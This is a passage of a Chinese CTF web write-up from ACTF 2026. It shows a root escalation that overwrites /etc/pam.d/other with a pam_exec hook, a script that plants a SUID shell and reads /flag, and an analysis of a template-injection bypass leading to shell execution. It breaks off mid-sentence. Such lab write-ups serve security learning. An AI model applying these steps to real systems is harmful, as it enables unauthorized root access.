+<p>来自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mqRa8Fx2mtN0V87Ad9cDJA">ACTF 2026 WEB 部分write up</a></p>
+<p>系统版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Debian 12 bookworm</span><br></pre></td></tr></table></figure>
+<p>内核版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 46b81d0535c2 4.18.0-240.el8.x86_64</span><br></pre></td></tr></table></figure>
+<p>关键 SUID 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool</span><br></pre></td></tr></table></figure>
+<p>其中最特殊的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool</span><br></pre></td></tr></table></figure>
+<p>这个文件是 SUID root，并且会调用 PAM。</p>
+<p>逆向 <code>auth_pam_tool</code> 后可以确认几个关键点。</p>
+<p>首先，它很早就会执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setreuid(0, 0);</span><br></pre></td></tr></table></figure>
+<p>也就是说，后续逻辑会以 root 权限运行。</p>
+<p>其次，它默认使用的 PAM service 名称是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>
+<p>但是系统中不存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/pam.d/mysql</span><br></pre></td></tr></table></figure>
+<p>因此 PAM 会 fallback 到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/pam.d/other</span><br></pre></td></tr></table></figure>
+<p>这就给了一个提权思路：</p>
+<blockquote>
+<p>如果能够覆盖 <code>/etc/pam.d/other</code>，再触发 <code>auth_pam_tool</code>，就可以让 PAM 模块以 root 身份执行我们指定的逻辑。</p>
+</blockquote>
+<p><strong>利用方法：</strong></p>
+<p>目标容器里没有 <code>python3</code>，所以不能直接把 Python 版 PoC 扔上去跑。</p>
+<p>最终做法是：</p>
+<ol>
+<li>本地把 <code>copy-fail</code> PoC 改写成 C 版本。</li>
+<li>编译成静态 ELF。</li>
+<li>上传到远端 <code>/tmp/copyfail</code>。</li>
+<li>先对 <code>/tmp/probe</code> 做写入行为标定。</li>
+<li>确认 <code>step=4</code> 可以稳定连续覆盖。</li>
+<li>使用它覆盖 <code>/etc/pam.d/other</code>。</li>
+</ol>
+<p>最终写入 <code>/etc/pam.d/other</code> 的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth sufficient pam_exec.so seteuid /tmp/pe.sh</span><br><span class="line">account sufficient pam_permit.so</span><br><span class="line">password sufficient pam_permit.so</span><br><span class="line">session sufficient pam_permit.so</span><br></pre></td></tr></table></figure>
+<p>第一行是核心：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth sufficient pam_exec.so seteuid /tmp/pe.sh</span><br></pre></td></tr></table></figure>
+<p>含义是：</p>
+<ul>
+<li>认证阶段加载 <code>pam_exec.so</code></li>
+<li>使用 <code>seteuid</code> 保持有效 UID</li>
+<li>执行 <code>/tmp/pe.sh</code></li>
+<li>如果执行成功，则认证通过</li>
+</ul>
+<p>由于触发者是 SUID root 程序，所以 <code>/tmp/pe.sh</code> 会以 root 身份执行。</p>
+<p>提前写入 <code>/tmp/pe.sh</code>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">id</span> &gt;/tmp/pid</span><br><span class="line"><span class="built_in">cp</span> /bin/sh /tmp/r</span><br><span class="line"><span class="built_in">chmod</span> 4755 /tmp/r</span><br><span class="line"><span class="built_in">cat</span> /flag &gt;/tmp/f 2&gt;/tmp/e</span><br><span class="line"><span class="built_in">chmod</span> 644 /tmp/pid /tmp/f /tmp/e 2&gt;/dev/null</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
+<p>这个脚本做了几件事：</p>
+<ol>
+<li>把当前身份写入 <code>/tmp/pid</code>。</li>
+<li>复制 <code>/bin/sh</code> 到 <code>/tmp/r</code>。</li>
+<li>给 <code>/tmp/r</code> 加上 SUID 权限。</li>
+<li>读取 <code>/flag</code> 到 <code>/tmp/f</code>。</li>
+<li>调整输出文件权限，方便后续读取。</li>
+</ol>
+<p>覆盖完 <code>/etc/pam.d/other</code> 后，再次调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool</span><br></pre></td></tr></table></figure>
+<p>由于默认 service 仍然是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>
+<p>而系统中不存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/pam.d/mysql</span><br></pre></td></tr></table></figure>
+<p>所以 PAM 会 fallback 到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/pam.d/other</span><br></pre></td></tr></table></figure>
+<p>也就是我们刚刚覆盖的配置。</p>
+<p>最终触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pam_exec.so seteuid /tmp/pe.sh</span><br></pre></td></tr></table></figure>
+<p><code>/tmp/pe.sh</code> 以 root 身份执行。</p>
+<p>成功后，远端生成三个关键文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/pid</span><br><span class="line">/tmp/r</span><br><span class="line">/tmp/f</span><br></pre></td></tr></table></figure>
+<p>其中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/pid</span><br></pre></td></tr></table></figure>
+<p>记录执行身份，结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=0(root) gid=101(mysql)</span><br></pre></td></tr></table></figure>
+<p><code>/tmp/r</code> 是 SUID shell。</p>
+<p><code>/tmp/f</code> 是 <code>/flag</code> 的内容。</p>
+<p>验证 SUID shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/r -p -c &#x27;id&#x27;</span><br></pre></td></tr></table></figure>
+<p>结果类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=100(mysql) gid=101(mysql) euid=0(root) groups=101(mysql)</span><br></pre></td></tr></table></figure>
+<p>说明已经获得 <code>euid=0</code>。</p>
+<h5 id="预期解-draw模板rce"><a class="markdownIt-Anchor" href="#预期解-draw模板rce"></a> 预期解-<code>/draw</code>模板rce</h5>
+<p>首先执行 ps -ef 可以看到 go 应用进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UID          PID    PPID  C STIME TTY          TIME CMD</span><br><span class="line">root           1       0  0 12:09 ?        00:00:00 /usr/local/bin/41323461_myapp</span><br></pre></td></tr></table></figure>
+<p>发现 go myapp 以 root 权限执行，结合前面未知的 draw 路由，可以合理推测需要审计那个路由的源代码，里面存在到达 RCE 的逻辑。</p>
+<p>尝试把这个文件下载下来</p>
+<p>然后可以让 ai 帮忙逆向一下恢复函数逻辑</p>
+<ul>
+<li><code>/calc</code></li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calcHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> r.Method != <span class="string">&quot;GET&quot;</span> &amp;&amp; r.Method != <span class="string">&quot;POST&quot;</span> &#123;</span><br><span class="line">        http.Error(w, <span class="string">&quot;method not allowed&quot;</span>, <span class="number">405</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result stringvar err errorif r.Method == <span class="string">&quot;POST&quot;</span> &#123;</span><br><span class="line">        expression := r.FormValue(<span class="string">&quot;expression&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> checkInput(expression) != <span class="literal">nil</span> &#123;</span><br><span class="line">            result = <span class="string">&quot;invalid input&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            query := fmt.Sprintf(<span class="string">&quot;SELECT %s;&quot;</span>, expression)</span><br><span class="line">            result, err = executeQuery(query)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    renderCalc(w, r, expression, result, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>/draw</code></li>
+</ul>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">drawHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> r.Method != <span class="string">&quot;GET&quot;</span> &#123;</span><br><span class="line">        http.Error(w, <span class="string">&quot;method not allowed&quot;</span>, <span class="number">405</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vars, err := parseTemplateVars(r)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(w, err.Error(), <span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page, err := parseTemplateString(drawTemplate, vars)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> errors.Is(err, unsafeErr) &#123;</span><br><span class="line">            http.Error(w, err.Error(), <span class="number">403</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            http.Error(w, err.Error(), <span class="number">500</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>)</span><br><span class="line">    w.Write([]<span class="type">byte</span>(page))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会将参数传入模板进行渲染：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Daily Number Draw<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;eyebrow&quot;</span>&gt;</span>Draw your number today<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">b</span>&gt;</span>&lt;\ %name% /&gt;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;number&quot;</span>&gt;</span></span><br><span class="line">      Your number today:</span><br><span class="line">      <span class="tag">&lt;<span class="name">b</span>&gt;</span>&lt;\ draw_number(%name%); /&gt;<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/draw&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Name&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Draw<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以发现模板渲染逻辑，边界符为 <code>&lt;\/&gt;</code>，渲染变量用 <code>%%</code></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseTemplateVars</span><span class="params">(r *http.Request)</span></span> (<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    vars := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span><br><span class="line"></span><br><span class="line">    query := r.URL.Query()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key, values := <span class="keyword">range</span> query &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(values) == <span class="number">0</span> &#123;</span><br><span class="line">            vars[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            vars[key] = values[<span class="number">0</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := validateTemplateVars(vars); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vars, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">validateTemplateVars</span><span class="params">(vars <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, value := <span class="keyword">range</span> vars &#123;</span><br><span class="line">        <span class="keyword">if</span> strings.Contains(value, <span class="string">`&lt;\`</span>) ||</span><br><span class="line">           strings.Contains(value, <span class="string">`/&gt;`</span>) ||</span><br><span class="line">           strings.Contains(value, <span class="string">`&#x27;`</span>) ||</span><br><span class="line">           strings.Contains(value, <span class="string">`;`</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> unsafeErr</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseTemplateString</span><span class="params">(tpl <span class="type">string</span>, vars <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">        block := templateBlockRe.FindString(tpl)</span><br><span class="line">        <span class="keyword">if</span> block == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> tpl, <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        replaced, err := commandHandler(block, vars)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tpl = strings.Replace(tpl, block, replaced, <span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;template recursion limit exceeded&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现输入参数存在 waf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;\</span><br><span class="line">/&gt;</span><br><span class="line">&#x27;</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+<p>渲染方式是通过正则匹配进行多次模板解析，主要的模板语法如下</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">templateBlockRe = regexp.MustCompile(<span class="string">`(?is)&lt;\\.*?/&gt;`</span>)</span><br><span class="line">varRe           = regexp.MustCompile(<span class="string">`(?is)%(.*)%`</span>)</span><br><span class="line">funcCallRe      = regexp.MustCompile(<span class="string">`(?is)^&lt;\\\s*?(([a-z0-9_]+)\(&#x27;([^&#x27;]*?)&#x27;\);\s*?(unsafe)?\s*?)\s*?/&gt;$`</span>)</span><br><span class="line">literalRe       = regexp.MustCompile(<span class="string">`(?is)^&lt;\\(\s*?(&#x27;[^&#x27;]*?&#x27;)*?\s*?)*?/&gt;$`</span>)</span><br></pre></td></tr></table></figure>
+<p>其中有函数调用语法：<code>&lt;\ func_name('argument'); unsafe(optional) /&gt;</code></p>
+<p>默认定义的函数如下：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">funcs := <span class="keyword">map</span>[<span class="type">string</span>]templateFunc&#123;</span><br><span class="line">    <span class="string">&quot;draw_number&quot;</span>: init.func1,</span><br><span class="line">    <span class="string">&quot;strrot&quot;</span>:      init.func2,</span><br><span class="line">    <span class="string">&quot;run&quot;</span>:         init.func3,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">safeFuncs := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>&#123;</span><br><span class="line">    <span class="string">&quot;draw_number&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;strrot&quot;</span>:      <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;run&quot;</span>:         <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中 run 函数为非安全函数，需要通过 <code>unsafe</code> 标记才能执行，它的调用逻辑是</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runCommand</span><span class="params">(cmd <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    ctx, cancel := context.WithTimeout(context.Background(), <span class="number">2</span>*time.Second)</span><br><span class="line">    <span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">    c := exec.CommandContext(ctx, <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd)</span><br><span class="line"></span><br><span class="line">    output, err := c.CombinedOutput()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) &gt; <span class="number">0x2000</span> &#123;</span><br><span class="line">        output = output[:<span class="number">0x2000</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> errors.Is(ctx.Err(), context.DeadlineExceeded) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="type">string</span>(output) + <span class="string">&quot;\ncommand timed out&quot;</span>, <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(output) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="type">string</span>(output), <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;command failed: %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(output), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这就是一个shell运行函数</p>
+<p>那思路很明显就是要想办法绕过 waf 来执行 ssti</p>
+<p><strong>关键漏洞点：</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">    block := templateBlockRe.FindString(tpl)  <span class="comment">// 找到 &lt;\ ... /&gt;</span></span><br><span class="line">    replaced, err := commandHandler(block, vars)  <span class="comment">// 替换成结果</span></span><br><span class="line">    tpl = strings.Replace(tpl, block, replaced, <span class="number">1</span>)  <span class="comment">// 更新模板</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里发现有多次的模板解析，也就是说第一次生成的内容，还能在第二轮变成模板。</p>
+<p>可以尝试利用变量解析来引入 ssti 的边界符</p>
+<p>需要注意的是，变量解析会引入单引号：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;\ %name% /&gt;</span><br><span class="line">=&gt; </span><br><span class="line">&lt;\ &#x27;Alice&#x27; /&gt;</span><br></pre></td></tr></table></figure>
+<p>而在最后的字面量解析时，会匹配出所有单引号内的内容，随后删除边界符</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">literalRe = regexp.MustCompile(<span class="string">`(?is)^&lt;\\(\s*?(&#x27;[^&#x27;]*?&#x27;)*?\s*?)*?/&gt;$`</span>)</span><br></pre></td></tr></table></figure>
+<p>因此我们可以引入双数数量的单引号，边界符可以双写绕过</p>
+<p>而分号没有办法引入，因此我们需要复用模板中的分号</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">b</span>&gt;</span>&lt;\ %name% /&gt;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;number&quot;</span>&gt;</span></span><br><span class="line">  Your number today:</span><br><span class="line">  <span class="tag">&lt;<span class="name">b</span>&gt;</span>&lt;\ draw_number(%name%); /&gt;<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那么，我们就需要保留模板中的 <code>%);</code>，由于模板语法匹配都是贪婪的，因此可以尝试让将最后一个 % 匹配到 %name% 解析后的其中一个 %，也就是需要尝试构造出</p>
